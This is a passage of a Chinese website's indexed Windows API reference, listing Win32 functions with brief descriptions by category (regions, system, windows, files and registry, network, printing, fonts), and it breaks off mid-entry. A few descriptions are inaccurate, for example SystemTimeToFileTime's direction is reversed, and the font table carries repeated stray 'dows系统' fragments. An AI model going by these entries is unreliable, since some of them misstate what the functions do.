提供的功能有创建和管理屏幕和大多数基本控件（control），比如按钮和滚动条。接收鼠标和键盘输入，以及其他与GUI有关的功能。这些调用接口位于：16位Windows下的user.exe，以及32位Windows下的user32.dll。从Windows XP版本之后，基本控件和通用对话框控件（Common Control Library）的调用接口放在comctl32.dll中。 通用对话框链接库（Common Dialog Box Library）： 为应用程序提供标准对话框，比如打开/保存文档对话框、颜色对话框和字体对话框等等。这个链接库位于：16位Windows下的commdlg.dll中，以及32位Windows下comdlg32.dll中。它被归类为User Interface API之下。 通用控件链接库（Common Control Library）：为应用程序提供接口来访问操作系统提供的一些高级控件。比如像：状态栏（status bar）、进度条（progress bars）、工具栏（toolbar）和标签（tab）。这个链接库位于：16位Windows下的commctrl.dll中，以及32位Windows下comctl32.dll中。。它被归类为User Interface API之下。 Windows外壳（Windows Shell）：作为Windows API的组成部分，不仅允许应用程序访问Windows外壳提供的功能，还对之有所改进和增强。它位于16位Windows下的shell.dll中，以及32位Windows下的shell32.dll中（Windows 95则在 shlwapi.dll中）。 它被归类为User Interface API之下。 网络服务（Network Services）：为访问操作系统提供的多种网络 功能提供接口。它包括NetBIOS、Winsock、NetDDE及RPC等。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/10、设备场景函数.html":{"url":"4.编程语言/Windows_API/10、设备场景函数.html","title":"10、设备场景函数","keywords":"","body":" 函数名 功能描述 CombineRgn 将两个区域组合为一个新区域 CombineTransform 驱动世界转换。它相当于依顺序进行两次转换 CreateCompatibleDC 创建一个与特定设备场景一致的内存设备场景 CreateDC 为专门设备创建设备场景 CreateEllipticRgn 创建一个椭圆 CreateEllipticRgnIndirect 创建一个内切于特定矩形的椭圆区域 CreateIC 为专用设备创建一个信息场景 CreatePolygonRgn 创建一个由一系列点围成的区域 CreatePolyPolygonRgn 创建由多个多边形构成的区域。每个多边形都应是封闭的 CreateRectRgn 创建一个矩形区域 CreateRectRgnIndirect 创建一个矩形区域 CreateRoundRectRgn 创建一个圆角矩形 DeleteDC 删除专用设备场景或信息场景，释放所有相关窗口资源 DPtoLP 将点阵从设备坐标转换到专用设备场景逻辑坐标 EqualRgn 确定两个区域是否相等 ExcludeClipRect 从专用设备场景的剪裁区中去掉一个矩形区。矩形内不能进行绘图 ExcludeUpdateRgn 从专用设备场景剪裁区去掉指定窗口的刷新区域 ExtCreateRegion 根据世界转换修改区域 ExtSelectClipRgn 将指定区域组合到设备场景的当前剪裁区 FillRgn 用指定刷子填充指定区域 FrameRgn 用指定刷子围绕指定区域画一个外框 GetBoundsRect 获取指定设备场景的边界矩形 GetClipBox 获取完全包含指定设备场景剪裁区的最小矩形 GetClipRgn 获取设备场景当前剪裁区 GetDC 获取指定窗口的设备场景 GetDCEx 为指定窗口获取设备场景。相比GetDC，本函数提供了更多的选项 GetDCOrgEx 获取指定设备场景起点位置（以屏幕坐标表示） GetDeviceCaps 根据指定设备场景代表的设备的功能返回信息 GetGraphicsMode 确定是否允许增强图形模式（世界转换） GetMapMode 为特定设备场景调入映象模式 GetRegionData 装入描述一个区域信息的RgnData结构或缓冲区 GetRgnBox 获取完全包含指定区域的最小矩形 GetUpdateRgn 确定指定窗口的刷新区域。该区域当前无效，需要刷新 GetViewportExtEx 获取设备场景视口（viewport）范围 GetViewportOrgEx 获取设备场景视口起点 GetWindowDC 获取整个窗口（包括边框、滚动条、标题栏、菜单等）的设备场景 GetWindowExtEx 获取指定设备场景的窗口范围 GetWindowOrgEx 获取指定设备场景的逻辑窗口的起点 GetWindowRgn 获取窗口区域 GetWorldTransform 如果有世界转换，为设备场景获取当前世界转换 IntersectClipRect 为指定设备定义一个新的剪裁区 InvalidateRgn 使窗口指定区域不活动，并将它加入窗口刷新区，使之可随后被重画 InvertRgn 通过颠倒每个像素值反转设备场景指定区域 LPtoDP 将点阵从指定设备场景逻辑坐标转换为设备坐标 ModifyWorldTransform 根据指定的模式修改世界转换 OffsetClipRgn 按指定量平移设备场景剪裁区 OffsetRgn 按指定偏移量平移指定区域 OffsetViewportOrgEx 平移设备场景视口区域 OffsetWindowOrgEx 平移指定设备场景窗口起点 PaintRgn 用当前刷子背景色填充指定区域 PtInRegion 确定点是否在指定区域内 PtVisible 确定指定点是否可见（即，点是否在设备场景剪裁区内） RectInRegion 确定矩形是否有部分在指定区域内 RectVisible 确定指定矩形是否有部分可见（是否在设备场景剪裁区内） ReleaseDC 释放由调用GetDC或GetWindowDC函数获取的指定设备场景 RestoreDC 从设备场景堆栈恢复一个原先保存的设备场景 SaveDC 将指定设备场景状态保存到Windows设备场景堆栈 ScaleViewportExtEx 缩放设备场景视口的范围 ScaleWindowExtEx 缩放指定设备场景窗口范围 ScrollDC 在窗口（由设备场景代表）中水平和（或）垂直滚动矩形 SelectClipRgn 为指定设备场景选择新的剪裁区 SetBoundsRect 设置指定设备场景的边界矩形 SetGraphicsMode 允许或禁止增强图形模式，以提供某些支持（包括世界转换） SetMapMode 设置指定设备场景的映射模式 SetRectRgn 设置区域为指定的矩形 SetViewportExtEx 设置设备场景视口范围 SetViewportOrgEx 设置设备场景视口起点 SetWindowExtEx 设置指定设备场景窗口范围 SetWindowOrgEx 设置指定设备场景窗口起点 SetWindowRgn 设置窗口区域 SetWorldTransform 设置世界转换 ValidateRgn 激活窗口中指定区域，把它从刷新区移走 WindowFromDC 取回与某一设备场景相关的窗口的句柄 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/11、硬件与系统函数.html":{"url":"4.编程语言/Windows_API/11、硬件与系统函数.html","title":"11、硬件与系统函数","keywords":"","body":" 函数名 功能描述 ActivateKeyboardLayout 激活一个新的键盘布局。键盘布局定义了按键在一种物理性键盘上的位置与含义 Beep 用于生成简单的声音 CharToOem 将一个字串从ANSI字符集转换到OEM字符集 ClipCursor 将指针限制到指定区域 ConvertDefaultLocale 将一个特殊的地方标识符转换成真实的地方ID CreateCaret 根据指定的信息创建一个插入符（光标），并将它选定为指定窗口的默认插入符 DestroyCaret 清除（破坏）一个插入符 EnumCalendarInfo 枚举在指定\"地方\"环境中可用的日历信息 EnumDateFormats 列举指定的\"当地\"设置中可用的长、短日期格式 EnumSystemCodePages 枚举系统中已安装或支持的代码页 EnumSystemLocales 枚举系统已经安装或提供支持的\"地方\"设置 EnumTimeFormats 枚举一个指定的地方适用的时间格式 ExitWindowsEx 退出windows，并用特定的选项重新启动 ExpandEnvironmentStrings 扩充环境字串 FreeEnvironmentStrings 翻译指定的环境字串块 GetACP 判断目前正在生效的ANSI代码页 GetAsyncKeyState 判断函数调用时指定虚拟键的状态 GetCaretBlinkTime 判断插入符光标的闪烁频率 GetCaretPos 判断插入符的当前位置 GetClipCursor 取得一个矩形，用于描述目前为鼠标指针规定的剪切区域 GetCommandLine 获得指向当前命令行缓冲区的一个指针 GetComputerName 取得这台计算机的名称 GetCPInfo 取得与指定代码页有关的信息 GetCurrencyFormat 针对指定的\"地方\"设置，根据货币格式格式化一个数字 GetCursor 获取目前选择的鼠标指针的句柄 GetCursorPos 获取鼠标指针的当前位置 GetDateFormat 针对指定的\"当地\"格式，对一个系统日期进行格式化 GetDoubleClickTime 判断连续两次鼠标单击之间会被处理成双击事件的间隔时间 GetEnvironmentStrings 为包含了当前环境字串设置的一个内存块分配和返回一个句柄 GetEnvironmentVariable 取得一个环境变量的值 GetInputState 判断是否存在任何待决（等待处理）的鼠标或键盘事件 GetKBCodePage 由GetOEMCP取代，两者功能完全相同 GetKeyboardLayout 取得一个句柄，描述指定应用程序的键盘布局 GetKeyboardLayoutList 获得系统适用的所有键盘布局的一个列表 GetKeyboardLayoutName 取得当前活动键盘布局的名称 GetKeyboardState 取得键盘上每个虚拟键当前的状态 GetKeyboardType 了解与正在使用的键盘有关的信息 GetKeyNameText 在给出扫描码的前提下，判断键名 GetKeyState 针对已处理过的按键，在最近一次输入信息时，判断指定虚拟键的状态 GetLastError 针对之前调用的api函数，用这个函数取得扩展错误信息 GetLocaleInfo 取得与指定\"地方\"有关的信息 GetLocalTime 取得本地日期和时间 GetNumberFormat 针对指定的\"地方\"，按特定的格式格式化一个数字 GetOEMCP 判断在OEM和ANSI字符集间转换的windows代码页 GetQueueStatus 判断应用程序消息队列中待决（等待处理）的消息类型 GetSysColor 判断指定windows显示对象的颜色 GetSystemDefaultLangID 取得系统的默认语言ID GetSystemDefaultLCID 取得当前的默认系统\"地方\" GetSystemInfo 取得与底层硬件平台有关的信息 GetSystemMetrics 返回与windows环境有关的信息 GetSystemPowerStatus 获得与当前系统电源状态有关的信息 GetSystemTime 取得当前系统时间，这个时间采用的是\"协同世界时间\"（即UTC，也叫做GMT）格式 GetSystemTimeAdjustment 使内部系统时钟与一个外部的时钟信号源同步 GetThreadLocale 取得当前线程的地方ID GetTickCount 用于获取自windows启动以来经历的时间长度（毫秒） GetTimeFormat 针对当前指定的\"地方\"，按特定的格式格式化一个系统时间 GetTimeZoneInformation 取得与系统时区设置有关的信息 GetUserDefaultLangID 为当前用户取得默认语言ID GetUserDefaultLCID 取得当前用户的默认\"地方\"设置 GetUserName 取得当前用户的名字 GetVersion 判断当前运行的Windows和DOS版本 GetVersionEx 取得与平台和操作系统有关的版本信息 HideCaret 在指定的窗口隐藏插入符（光标） IsValidCodePage 判断一个代码页是否有效 IsValidLocale 判断地方标识符是否有效 keybd_event 这个函数模拟了键盘行动 LoadKeyboardLayout 载入一个键盘布局 MapVirtualKey 根据指定的映射类型，执行不同的扫描码和字符转换 MapVirtualKeyEx 根据指定的映射类型，执行不同的扫描码和字符转换 MessageBeep 播放一个系统声音。系统声音的分配方案是在控制面板里决定的 mouse_event 模拟一次鼠标事件 OemKeyScan 判断OEM字符集中的一个ASCII字符的扫描码和Shift键状态 OemToChar 将OEM字符集的一个字串转换到ANSI字符集 SetCaretBlinkTime 指定插入符（光标）的闪烁频率 SetCaretPos 指定插入符的位置 SetComputerName 设置新的计算机名 SetCursor 将指定的鼠标指针设为当前指针 SetCursorPos 设置指针的位置 SetDoubleClickTime 设置连续两次鼠标单击之间能使系统认为是双击事件的间隔时间 SetEnvironmentVariable 将一个环境变量设为指定的值 SetKeyboardState 设置每个虚拟键当前在键盘上的状态 SetLocaleInfo 改变用户\"地方\"设置信息 SetLocalTime 设置当前地方时间 SetSysColors 设置指定窗口显示对象的颜色 SetSystemCursor 改变任何一个标准系统指针 SetSystemTime 设置当前系统时间 SetSystemTimeAdjustment 定时添加一个校准值使内部系统时钟与一个外部的时钟信号源同步 SetThreadLocale 为当前线程设置地方 SetTimeZoneInformation 设置系统时区信息 ShowCaret 在指定的窗口里显示插入符（光标） ShowCursor 控制鼠标指针的可视性 SwapMouseButton 决定是否互换鼠标左右键的功能 SystemParametersInfo 获取和设置数量众多的windows系统参数 SystemTimeToTzSpecificLocalTime 将系统时间转换成地方时间 ToAscii 根据当前的扫描码和键盘信息，将一个虚拟键转换成ASCII字符 ToUnicode 根据当前的扫描码和键盘信息，将一个虚拟键转换成Unicode字符 UnloadKeyboardLayout 卸载指定的键盘布局 VkKeyScan 针对Windows字符集中一个ASCII字符，判断虚拟键码和Shift键的状态 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/13、控件与消息函数.html":{"url":"4.编程语言/Windows_API/13、控件与消息函数.html","title":"13、控件与消息函数","keywords":"","body":" 函数名 功能描述 AdjustWindowRect 给定一种窗口样式，计算获得目标客户区矩形所需的窗口大小 AnyPopup 判断屏幕上是否存在任何弹出式窗口 ArrangeIconicWindows 排列一个父窗口的最小化子窗口 AttachThreadInput 连接线程输入函数 BeginDeferWindowPos 启动构建一系列新窗口位置的过程 BringWindowToTop 将指定的窗口带至窗口列表顶部 CascadeWindows 以层叠方式排列窗口 ChildWindowFromPoint 返回父窗口中包含了指定点的第一个子窗口的句柄 ClientToScreen 判断窗口内以客户区坐标表示的一个点的屏幕坐标 CloseWindow 最小化指定的窗口 CopyRect 矩形内容复制 DeferWindowPos 该函数为特定的窗口指定一个新窗口位置 DestroyWindow 清除指定的窗口以及它的所有子窗口 DrawAnimatedRects 描绘一系列动态矩形 EnableWindow 指定的窗口里允许或禁止所有鼠标及键盘输入 EndDeferWindowPos 同时更新DeferWindowPos调用时指定的所有窗口的位置及状态 EnumChildWindows 为指定的父窗口枚举子窗口 EnumThreadWindows 枚举与指定任务相关的窗口 EnumWindows 枚举窗口列表中的所有父窗口 EqualRect 判断两个矩形结构是否相同 FindWindow 寻找窗口列表中第一个符合指定条件的顶级窗口 FindWindowEx 在窗口列表中寻找与指定条件相符的第一个子窗口 FlashWindow 闪烁显示指定窗口 GetActiveWindow 获得活动窗口的句柄 GetCapture 获得一个窗口的句柄，这个窗口位于当前输入线程，且拥有鼠标捕获（鼠标活动由它接收） GetClassInfo 取得WNDCLASS结构（或WNDCLASSEX结构）的一个副本，结构中包含了与指定类有关的信息 GetClassLong 取得窗口类的一个Long变量条目 GetClassName 为指定的窗口取得类名 GetClassWord 为窗口类取得一个整数变量 GetClientRect 返回指定窗口客户区矩形的大小 GetDesktopWindow 获得代表整个屏幕的一个窗口（桌面窗口）句柄 GetFocus 获得拥有输入焦点的窗口的句柄 GetForegroundWindow 获得前台窗口的句柄 GetLastActivePopup 获得在一个给定父窗口中最近激活过的弹出式窗口的句柄 GetParent 判断指定窗口的父窗口 GetTopWindow 搜索内部窗口列表，寻找隶属于指定窗口的头一个窗口的句柄 GetUpdateRect 获得一个矩形，它描叙了指定窗口中需要更新的那一部分 GetWindow 获得一个窗口的句柄，该窗口与某源窗口有特定的关系 GetWindowContextHelpId 取得与窗口关联在一起的帮助场景ID GetWindowLong 从指定窗口的结构中取得信息 GetWindowPlacement 获得指定窗口的状态及位置信息 GetWindowRect 获得整个窗口的范围矩形，窗口的边框、标题栏、滚动条及菜单等都在这个矩形内 GetWindowText 取得一个窗体的标题（caption）文字，或者一个控件的内容 GetWindowTextLength 调查窗口标题文字或控件内容的长短 GetWindowWord 获得指定窗口结构的信息 InflateRect 增大或减小一个矩形的大小 IntersectRect 这个函数在lpDestRect里载入一个矩形，它是lpSrc1Rect与lpSrc2Rect两个矩形的交集 InvalidateRect 屏蔽一个窗口客户区的全部或部分区域 IsChild 判断一个窗口是否为另一窗口的子或隶属窗口 IsIconic 判断窗口是否已最小化 IsRectEmpty 判断一个矩形是否为空 IsWindow 判断一个窗口句柄是否有效 IsWindowEnabled 判断窗口是否处于活动状态 IsWindowUnicode 判断一个窗口是否为Unicode窗口。这意味着窗口为所有基于文本的消息都接收Unicode文字 IsWindowVisible 判断窗口是否可见 IsZoomed 判断窗口是否最大化 LockWindowUpdate 锁定指定窗口，禁止它更新 MapWindowPoints 将一个窗口客户区坐标的点转换到另一窗口的客户区坐标系统 MoveWindow 改变指定窗口的位置和大小 OffsetRect 通过应用一个指定的偏移，从而让矩形移动起来 OpenIcon 恢复一个最小化的程序，并将其激活 PtInRect 判断指定的点是否位于矩形内部 RedrawWindow 重画全部或部分窗口 ReleaseCapture 为当前的应用程序释放鼠标捕获 ScreenToClient 判断屏幕上一个指定点的客户区坐标 ScrollWindow 滚动窗口客户区的全部或一部分 ScrollWindowEx 根据附加的选项，滚动窗口客户区的全部或部分 SetActiveWindow 激活指定的窗口 SetCapture 将鼠标捕获设置到指定的窗口 SetClassLong 为窗口类设置一个Long变量条目 SetClassWord 为窗口类设置一个条目 SetFocusAPI 将输入焦点设到指定的窗口。如有必要，会激活窗口 SetForegroundWindow 将窗口设为系统的前台窗口 SetParent 指定一个窗口的新父 SetRect 设置指定矩形的内容 SetRectEmpty 将矩形设为一个空矩形 SetWindowContextHelpId 为指定的窗口设置帮助场景（上下文）ID SetWindowLong 在窗口结构中为指定的窗口设置信息 SetWindowPlacement 设置窗口状态和位置信息 SetWindowPos 为窗口指定一个新位置和状态 SetWindowText 设置窗口的标题文字或控件的内容 SetWindowWord 在窗口结构中为指定的窗口设置信息 ShowOwnedPopups 显示或隐藏由指定窗口所有的全部弹出式窗口 ShowWindow 控制窗口的可见性 ShowWindowAsync 与ShowWindow相似 SubtractRect 装载矩形lprcDst，它是在矩形lprcSrc1中减去lprcSrc2得到的结果 TileWindows 以平铺顺序排列窗口 UnionRect 装载一个lpDestRect目标矩形，它是lpSrc1Rect和lpSrc2Rect联合起来的结果 UpdateWindow 强制立即更新窗口 ValidateRect 校验窗口的全部或部分客户区 WindowFromPoint 返回包含了指定点的窗口的句柄。忽略屏蔽、隐藏以及透明窗口 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/2、文件处理函数.html":{"url":"4.编程语言/Windows_API/2、文件处理函数.html","title":"2、文件处理函数","keywords":"","body":" 函数名 功能描述 CloseHandle 关闭一个内核对象。其中包括文件、文件映射、进程、线程、安全和同步对象等 CompareFileTime 对比两个文件的时间 CopyFile 复制文件 CreateDirectory 创建一个新目录 CreateFile 打开和创建文件、管道、邮槽、通信服务、设备以及控制台 CreateFileMapping 创建一个新的文件映射对象 DeleteFile 删除指定文件 DeviceIoControl 对设备执行指定的操作 DosDateTimeToFileTime 将DOS日期和时间值转换成一个 win32 FILETIME 值 FileTimeToDosDateTime 将一个 win32 FILETIME 值转换成DOS日期和时间值 FileTimeToLocalFileTime 将一个FILETIME结构转换成本地时间 FileTimeToSystemTime 根据一个FILETIME结构的内容，装载一个SYSTEMTIME结构 FindClose 关闭由FindFirstFile函数创建的一个搜索句柄 FindFirstFile 根据文件名查找文件 FindNextFile 根据调用FindFirstFile函数时指定的一个文件名查找下一个文件 FlushFileBuffers 针对指定的文件句柄，刷新内部文件缓冲区 FlushViewOfFile 将写入文件映射缓冲区的所有数据都刷新到磁盘 GetBinaryType 判断文件是否可以执行 GetCompressedFileSize 判断一个压缩文件在磁盘上实际占据的字节数 GetCurrentDirectory 获取当前进程的所在目录 GetDiskFreeSpace 获取与一个磁盘的组织有关的信息，以及了解剩余空间的容量 GetDiskFreeSpaceEx 获取与一个磁盘的组织以及剩余空间容量有关的信息 GetDriveType 判断一个磁盘驱动器的类型 GetExpandedName 取得一个压缩文件的全名 GetFileAttributes 判断指定文件的属性 GetFileInformationByHandle 这个函数提供了获取文件信息的一种机制 GetFileSize 判断文件长度 GetFileTime 取得指定文件的时间信息 GetFileType 在给出文件句柄的前提下，判断文件类型 GetFileVersionInfo 从支持版本标记的一个模块里获取文件版本信息 GetFileVersionInfoSize 针对包含了版本资源的一个文件，判断容纳文件版本信息需要一个多大的缓冲区 GetFullPathName 获取指定文件的完整路径名 GetLogicalDrives 判断系统中存在哪些逻辑驱动器字母 GetLogicalDriveStrings 获取一个字串，其中包含了当前所有逻辑驱动器的根驱动器路径 GetOverlappedResult 判断一个重叠操作当前的状态 GetPrivateProfileInt 为初始化文件（.ini文件）中指定的条目获取一个整数值 GetPrivateProfileSection 获取指定小节（在.ini文件中）所有项名和值的一个列表 GetPrivateProfileString 为初始化文件中指定的条目取得字串 GetProfileInt 取得win.ini初始化文件中指定条目的一个整数值 GetProfileSection 获取指定小节（在win.ini文件中）所有项名和值的一个列表 GetProfileString 为win.ini初始化文件中指定的条目取得字串 GetShortPathName 获取指定文件的短路径名 GetSystemDirectory 取得Windows系统目录（即System目录）的完整路径名 GetTempFileName 这个函数包含了一个临时文件的名字，它可由应用程序使用 GetTempPath 获取为临时文件指定的路径 GetVolumeInformation 获取与一个磁盘卷有关的信息 GetWindowsDirectory 获取Windows目录的完整路径名 hread 参考lread hwrite 参考lwrite函数 lclose 关闭指定的文件 lcreat 创建一个文件 llseek 设置文件中进行读写的当前位置 LockFile 锁定文件的某一部分，使其不与其他应用程序共享 LockFileEx 与LockFile相似，只是它提供了更多的功能 lopen 以二进制模式打开指定的文件 lread 将文件中的数据读入内存缓冲区 lwrite 将数据从内存缓冲区写入一个文件 LZClose 关闭由LZOpenFile 或 LZInit函数打开的一个文件 LZCopy 复制一个文件 LZInit 这个函数用于初始化内部缓冲区 LZOpenFile 该函数能执行大量不同的文件处理，而且兼容于压缩文件 LZRead 将数据从文件读入内存缓冲区 LZSeek 设置一个文件中进行读写的当前位置 MapViewOfFile 将一个文件映射对象映射到当前应用程序的地址空间 MoveFile 移动文件 OpenFile 这个函数能执行大量不同的文件操作 OpenFileMapping 打开一个现成的文件映射对象 QueryDosDevice 在Windows NT中，DOS设备名会映射成NT系统设备名。该函数可判断当前的设备映射情况 ReadFile 从文件中读出数据 ReadFileEx 与ReadFile相似，只是它只能用于异步读操作，并包含了一个完整的回调 RegCloseKey 关闭系统注册表中的一个项（或键） RegConnectRegistry 访问远程系统的部分注册表 RegCreateKey 在指定的项下创建或打开一个项 RegCreateKeyEx 在指定项下创建新项的更复杂的方式。在Win32环境中建议使用这个函数 RegDeleteKey 删除现有项下方一个指定的子项 RegDeleteValue 删除指定项下方的一个值 RegEnumKey 枚举指定项的子项。在Win32环境中应使用RegEnumKeyEx RegEnumKeyEx 枚举指定项下方的子项 RegEnumValue 枚举指定项的值 RegFlushKey 将对项和它的子项作出的改动实际写入磁盘 RegGetKeySecurity 获取与一个注册表项有关的安全信息 RegLoadKey 从以前用RegSaveKey函数创建的一个文件里装载注册表信息 RegNotifyChangeKeyValue 注册表项或它的任何一个子项发生变化时，用这个函数提供一种通知机制 RegOpenKey 打开一个现有的注册表项 RegOpenKeyEx 打开一个现有的项。在win32下推荐使用这个函数 RegQueryInfoKey 获取与一个项有关的信息 RegQueryValue 取得指定项或子项的默认（未命名）值 RegQueryValueEx 获取一个项的设置值 RegReplaceKey 用一个磁盘文件保存的信息替换注册表信息；并创建一个备份，在其中包含当前注册表信息 RegRestoreKey 从一个磁盘文件恢复注册表信息 RegSaveKey 将一个项以及它的所有子项都保存到一个磁盘文件 RegSetKeySecurity 设置指定项的安全特性 RegSetValue 设置指定项或子项的默认值 RegSetValueEx 设置指定项的值 RegUnLoadKey 卸载指定的项以及它的所有子项 RemoveDirectory 删除指定目录 SearchPath 查找指定文件 SetCurrentDirectory 设置当前目录 SetEndOfFile 针对一个打开的文件，将当前文件位置设为文件末尾 SetFileAttributes 设置文件属性 SetFilePointer 在一个文件中设置当前的读写位置 SetFileTime 设置文件的创建、访问及上次修改时间 SetHandleCount 这个函数不必在win32下使用；即使使用，也不会有任何效果 SetVolumeLabel 设置一个磁盘的卷标（Label） SystemTimeToFileTime 根据一个FILETIME结构的内容，载入一个SYSTEMTIME结构 UnlockFile 解除对一个文件的锁定 UnlockFileEx 解除对一个文件的锁定 UnmapViewOfFile 在当前应用程序的内存地址空间解除对一个文件映射对象的映射 VerFindFile 用这个函数决定一个文件应安装到哪里 VerInstallFile 用这个函数安装一个文件 VerLanguageName 这个函数能根据16位语言代码获取一种语言的名称 VerQueryValue 这个函数用于从版本资源中获取信息 WriteFile 将数据写入一个文件 WriteFileEx 与WriteFile类似，只是它只能用于异步写操作，并包括了一个完整的回调 WritePrivateProfileSection 为一个初始化文件（.ini）中指定的小节设置所有项名和值 WritePrivateProfileString 在初始化文件指定小节内设置一个字串 WriteProfileSection 为Win.ini初始化文件中一个指定的小节设置所有项名和值 WriteProfileString 在Win.ini初始化文件指定小节内设置一个字串 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/3、网络函数.html":{"url":"4.编程语言/Windows_API/3、网络函数.html","title":"3、网络函数","keywords":"","body":" 函数名 功能描述 WNetAddConnection 创建同一个网络资源的永久性连接 WNetAddConnection2 创建同一个网络资源的连接 WNetAddConnection3 创建同一个网络资源的连接 WNetCancelConnection 结束一个网络连接 WNetCancelConnection2 结束一个网络连接 WNetCloseEnum 结束一次枚举操作 WNetConnectionDialog 启动一个标准对话框，以便建立同网络资源的连接 WNetDisconnectDialog 启动一个标准对话框，以便断开同网络资源的连接 WNetEnumResource 枚举网络资源 WNetGetConnection 获取本地或已连接的一个资源的网络名称 WNetGetLastError 获取网络错误的扩展错误信息 WNetGetUniversalName 获取网络中一个文件的远程名称以及/或者UNC（统一命名规范）名称 WNetGetUser 获取一个网络资源用以连接的名字 WNetOpenEnum 启动对网络资源进行枚举的过程 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/4、消息函数.html":{"url":"4.编程语言/Windows_API/4、消息函数.html","title":"4、消息函数","keywords":"","body":" 函数名 功能描述 BroadcastSystemMessage 将一条系统消息广播给系统中所有的顶级窗口 GetMessagePos 取得消息队列中上一条消息处理完毕时的鼠标指针屏幕位置 GetMessageTime 取得消息队列中上一条消息处理完毕时的时间 PostMessage 将一条消息投递到指定窗口的消息队列 PostThreadMessage 将一条消息投递给应用程序 RegisterWindowMessage 获取分配给一个字串标识符的消息编号 ReplyMessage 答复一个消息 SendMessage 调用一个窗口的窗口函数，将一条消息发给那个窗口 SendMessageCallback 将一条消息发给窗口 SendMessageTimeout 向窗口发送一条消息 SendNotifyMessage 向窗口发送一条消息 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/5、打印函数.html":{"url":"4.编程语言/Windows_API/5、打印函数.html","title":"5、打印函数","keywords":"","body":" 函数名 功能描述 AbortDoc 取消一份文档的打印 AbortPrinter 删除与一台打印机关联在一起的缓冲文件 AddForm 为打印机的表单列表添加一个新表单 AddJob 用于获取一个有效的路径名，以便用它为作业创建一个后台打印文件。它也会为作业分配一个作业编号 AddMonitor 为系统添加一个打印机监视器 AddPort 启动\"添加端口\"对话框，允许用户在系统可用端口列表中加入一个新端口 AddPrinter 在系统中添加一台新打印机 AddPrinterConnection 连接指定的打印机 AddPrinterDriver 为指定的系统添加一个打印驱动程序 AddPrintProcessor 为指定的系统添加一个打印处理器 AddPrintProvidor 为系统添加一个打印供应商 AdvancedDocumentProperties 启动打印机文档设置对话框 ClosePrinter 关闭一个打开的打印机对象 ConfigurePort 针对指定的端口，启动一个端口配置对话框 ConnectToPrinterDlg 启动连接打印机对话框，用它同访问网络的打印机连接 DeleteForm 从打印机可用表单列表中删除一个表单 DeleteMonitor 删除指定的打印监视器 DeletePort 启动\"删除端口\"对话框，允许用户从当前系统删除一个端口 DeletePrinter 将指定的打印机标志为从系统中删除 DeletePrinterConnection 删除与指定打印机的连接 DeletePrinterDriver 从系统删除一个打印机驱动程序 DeletePrintProcessor 从指定系统删除一个打印处理器 DeletePrintProvidor 从系统中删除一个打印供应商 DeviceCapabilities 利用这个函数可获得与一个设备的能力有关的信息 DocumentProperties 打印机配置控制函数 EndDocAPI 结束一个成功的打印作业 EndDocPrinter 在后台打印程序的级别指定一个文档的结束 EndPage 用这个函数完成一个页面的打印，并准备设备场景，以便打印下一个页 EndPagePrinter 指定一个页在打印作业中的结尾 EnumForms 枚举一台打印机可用的表单 EnumJobs 枚举打印队列中的作业 EnumMonitors 枚举可用的打印监视器 EnumPorts 枚举一个系统可用的端口 EnumPrinterDrivers 枚举指定系统中已安装的打印机驱动程序 EnumPrinters 枚举系统中安装的打印机 EnumPrintProcessorDatatypes 枚举由一个打印处理器支持的数据类型 EnumPrintProcessors 枚举系统中可用的打印处理器 Escape 设备控制函数 FindClosePrinterChangeNotification 关闭用FindFirstPrinterChangeNotification函数获取的一个打印机通告对象 FindFirstPrinterChangeNotification 创建一个新的改变通告对象，以便我们注意打印机状态的各种变化 FindNextPrinterChangeNotification 用这个函数判断触发一次打印机改变通告信号的原因 FreePrinterNotifyInfo 释放由FindNextPrinterChangeNotification函数分配的一个缓冲区 GetForm 取得与指定表单有关的信息 GetJob 获取与指定作业有关的信息 GetPrinter 取得与指定打印机有关的信息 GetPrinterData 为打印机设置注册表配置信息 GetPrinterDriver 针对指定的打印机，获取与打印机驱动程序有关的信息 GetPrinterDriverDirectory 判断指定系统中包含了打印机驱动程序的目录是什么 GetPrintProcessorDirectory 判断指定系统中包含了打印机处理器驱动程序及文件的目录 OpenPrinter 打开指定的打印机，并获取打印机的句柄 PrinterMessageBox 在拥有指定打印作业的系统上显示一个打印机出错消息框 PrinterProperties 启动打印机属性对话框，以便对打印机进行配置 ReadPrinter 从打印机读入数据 ResetDC 重设一个设备场景 ResetPrinter 改变指定打印机的默认数据类型及文档设置 ScheduleJob 提交一个要打印的作业 SetAbortProc 为Windows指定取消函数的地址 SetForm 为指定的表单设置信息 SetJob 对一个打印作业的状态进行控制 SetPrinter 对一台打印机的状态进行控制 SetPrinterData 设置打印机的注册表配置信息 StartDoc 开始一个打印作业 StartDocPrinter 在后台打印的级别启动一个新文档 StartPage 打印一个新页前要先调用这个函数 StartPagePrinter 在打印作业中指定一个新页的开始 WritePrinter 将发送目录中的数据写入打印机 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/6、文本和字体函数.html":{"url":"4.编程语言/Windows_API/6、文本和字体函数.html","title":"6、文本和字体函数","keywords":"","body":" 函数名 功能描述dows系统 AddFontResource 在Windows系统中添加一种字体资源dows系统 CreateFont 用指定的属性创建一种逻辑字体dows系统 CreateFontIndirect 用指定的属性创建一种逻辑字体dows系统 CreateScalableFontResource 为一种TureType字体创建一个资源文件，以便能用API函数AddFontResource将其加入Windows系统 DrawText 将文本描绘到指定的矩形中dows系统 DrawTextEx 与DrawText相似，只是加入了更多的功能dows系统 EnumFontFamilies 